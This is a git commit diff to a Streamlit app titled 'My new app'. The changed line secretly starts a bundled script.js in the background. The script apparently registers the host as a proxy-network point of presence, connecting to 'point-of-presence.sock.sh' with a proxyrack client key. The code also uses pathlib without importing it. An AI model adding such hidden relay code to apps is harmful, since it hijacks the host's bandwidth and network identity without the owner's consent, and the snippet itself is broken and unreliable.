1dc6566a45bf6c5a2c356bf42e8e3d8bc93b7525
chaowenguo0 <chaowen.guo1@gmail.com>
2025-10-28 22:56:48 -0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,5 +1,4 @@
 import streamlit, asyncio, subprocess
 
-subprocess.Popen(['node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', '9' + '0' * 63, '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP')
-']
+subprocess.Popen(['node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'c' + '0' * 63, '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP'])
 streamlit.title("🎈 My new app")
